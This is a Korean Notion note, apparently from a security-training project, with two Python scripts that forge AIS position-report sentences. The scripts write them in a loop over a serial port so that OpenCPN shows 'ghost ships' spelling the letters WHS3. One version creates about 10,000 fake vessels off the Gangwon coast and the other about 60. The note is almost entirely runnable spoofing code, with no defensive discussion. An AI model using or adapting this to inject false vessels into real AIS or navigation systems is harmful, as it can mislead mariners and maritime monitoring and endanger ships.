---
notion_url: https://www.notion.so/330be0809830804086d9f69ba398ad35
last_synced: 2026-06-17 10:05
tags: [notion-sync]
---

# [프로토콜] OpenCPN 에 WHS 글자 띄우기 + 다이어그램

![image](_assets/image.png)

배 1만척 입니다.’

```python
import serial
import time

com = serial.Serial('COM8', 4800)

letter_map = {
    'W': [
        "#.....#",
        "#.....#",
        "#.....#",
        "#..#..#",
        "#..#..#",
        "#..#..#",
        "#.#.#.#",
        "#.#.#.#",
        "##...##",
    ],
    'H': [
        "#.....#",
        "#.....#",
        "#.....#",
        "#######",
        "#.....#",
        "#.....#",
        "#.....#",
        "#.....#",
        "#.....#",
    ],
    'S': [
        ".######",
        "#......",
        "#......",
        "#......",
        ".#####.",
        "......#",
        "......#",
        "......#",
        "######.",
    ],
    '3': [
        "######.",
        ".....##",
        "......#",
        ".....##",
        "....##.",
        "......#",
        "......#",
        ".....##",
        "######.",
    ],
}

BASE_LAT = 38.2070
BASE_LON = 128.5912

DOT_LAT_STEP = 0.0005  # 더 조밀하게
DOT_LON_STEP = 0.0005
CHAR_LON_GAP  = 0.05  # 문자 간격 넓게

PIXEL_EXPAND = 10  # 한 픽셀당 10x10배로 확대
MMSI_START = 440300000

def int_to_bits(value, length):
    return bin(value & ((1 << length) - 1))[2:].zfill(length)

def encode_lat_lon(lat, lon):
    lat_enc = int(lat * 600000)
    lon_enc = int(lon * 600000)
    return int_to_bits(lon_enc, 28), int_to_bits(lat_enc, 27)

def bits_to_sixbit_ascii(bits):
    result = ""
    for i in range(0, len(bits), 6):
        val = int(bits[i:i+6], 2)
        result += chr(val + 48) if val < 40 else chr(val + 56)
    return result

def make_aivdm_payload(mmsi, lat, lon):
    bits = ""
    bits += int_to_bits(1, 6)
    bits += int_to_bits(0, 2)
    bits += int_to_bits(mmsi, 30)
    bits += int_to_bits(0, 4)
    bits += int_to_bits(128, 8)
    bits += int_to_bits(10, 10)
    bits += int_to_bits(1, 1)
    lon_bits, lat_bits = encode_lat_lon(lat, lon)
    bits += lon_bits
    bits += lat_bits
    bits += int_to_bits(90, 12)
    bits += int_to_bits(511, 9)
    bits += int_to_bits(60, 6)
    bits += int_to_bits(0, 2)
    bits = bits.ljust(168, '0')
    return bits_to_sixbit_ascii(bits)

def make_aivdm_sentence(payload):
    sentence = f"!AIVDM,1,1,,A,{payload},0"
    checksum = 0
    for c in sentence[1:]:
        checksum ^= ord(c)
    return f"{sentence}*{checksum:02X}"

def get_ship_positions():
    ships = []
    letters = ['W', 'H', 'S', '3']
    for idx, char in enumerate(letters):
        grid = letter_map[char]
        for row in range(len(grid)):
            for col in range(len(grid[row])):
                if grid[row][col] == '#':
                    for y in range(PIXEL_EXPAND):
                        for x in range(PIXEL_EXPAND):
                            lat = BASE_LAT + ((len(grid) - row) * PIXEL_EXPAND + y) * DOT_LAT_STEP
                            lon = BASE_LON + (idx * CHAR_LON_GAP) + (col * PIXEL_EXPAND + x) * DOT_LON_STEP
                            mmsi = MMSI_START + len(ships)
                            ships.append((lat, lon, mmsi))
    return ships

ship_list = get_ship_positions()
print(f"[+] 생성된 AIS 유령 선박 수: {len(ship_list)}")

while True:
    for lat, lon, mmsi in ship_list:
        payload = make_aivdm_payload(mmsi, lat, lon)
        sentence = make_aivdm_sentence(payload)
        com.write((sentence + '\r\n').encode())
        print(f"[초대형 WHS3] {mmsi} at {lat:.5f}, {lon:.5f}")
        time.sleep(0.01)  # 빠른 전송
    time.sleep(1.0)
```



![image](_assets/image.png)

배 60척?

```python
import serial
import time

com = serial.Serial('COM8', 4800)

letter_map = {
    'W': [
        "#.....#",
        "#.....#",
        "#.....#",
        "#..#..#",
        "#..#..#",
        "#..#..#",
        "#.#.#.#",
        "#.#.#.#",
        "##...##",
    ],
    'H': [
        "#.....#",
        "#.....#",
        "#.....#",
        "#######",
        "#.....#",
        "#.....#",
        "#.....#",
        "#.....#",
        "#.....#",
    ],
    'S': [
        ".######",
        "#......",
        "#......",
        "#......",
        ".#####.",
        "......#",
        "......#",
        "......#",
        "######.",
    ],
    '3': [
        "######.",
        ".....##",
        "......#",
        ".....##",
        "....##.",
        "......#",
        "......#",
        ".....##",
        "######.",
    ],
}

# 기준 좌표 (BOB센터)
BASE_LAT = 37.479278527043
BASE_LON = 126.87637391137

DOT_LAT_STEP = 0.004
DOT_LON_STEP = 0.004
CHAR_LON_GAP  = 0.04  # ← 글자 간 간격 확장

MMSI_START = 440300000

def int_to_bits(value, length):
    return bin(value & ((1 << length) - 1))[2:].zfill(length)

def encode_lat_lon(lat, lon):
    lat_enc = int(lat * 600000)
    lon_enc = int(lon * 600000)
    return int_to_bits(lon_enc, 28), int_to_bits(lat_enc, 27)

def bits_to_sixbit_ascii(bits):
    result = ""
    for i in range(0, len(bits), 6):
        val = int(bits[i:i+6], 2)
        result += chr(val + 48) if val < 40 else chr(val + 56)
    return result

def make_aivdm_payload(mmsi, lat, lon):
    bits = ""
    bits += int_to_bits(1, 6)
    bits += int_to_bits(0, 2)
    bits += int_to_bits(mmsi, 30)
    bits += int_to_bits(0, 4)
    bits += int_to_bits(128, 8)
    bits += int_to_bits(10, 10)
    bits += int_to_bits(1, 1)
    lon_bits, lat_bits = encode_lat_lon(lat, lon)
    bits += lon_bits
    bits += lat_bits
    bits += int_to_bits(90, 12)
    bits += int_to_bits(511, 9)
    bits += int_to_bits(60, 6)
    bits += int_to_bits(0, 2)
    bits = bits.ljust(168, '0')
    return bits_to_sixbit_ascii(bits)

def make_aivdm_sentence(payload):
    sentence = f"!AIVDM,1,1,,A,{payload},0"
    checksum = 0
    for c in sentence[1:]:
        checksum ^= ord(c)
    return f"{sentence}*{checksum:02X}"

def get_ship_positions():
    ships = []
    letters = ['W', 'H', 'S', '3']
    for idx, char in enumerate(letters):
        grid = letter_map[char]
        for row in range(len(grid)):
            for col in range(len(grid[row])):
                if grid[row][col] == '#':
                    lat = BASE_LAT + ((len(grid) - row) * DOT_LAT_STEP)
                    lon = BASE_LON + (idx * CHAR_LON_GAP) + (col * DOT_LON_STEP)
                    mmsi = MMSI_START + len(ships)
                    ships.append((lat, lon, mmsi))
    return ships

ship_list = get_ship_positions()

while True:
    for lat, lon, mmsi in ship_list:
        payload = make_aivdm_payload(mmsi, lat, lon)
        sentence = make_aivdm_sentence(payload)
        com.write((sentence + '\r\n').encode())
        print(f"[강원도 WHS3] {mmsi} at {lat:.5f}, {lon:.5f}")
        time.sleep(0.1)
    time.sleep(1.0)
```
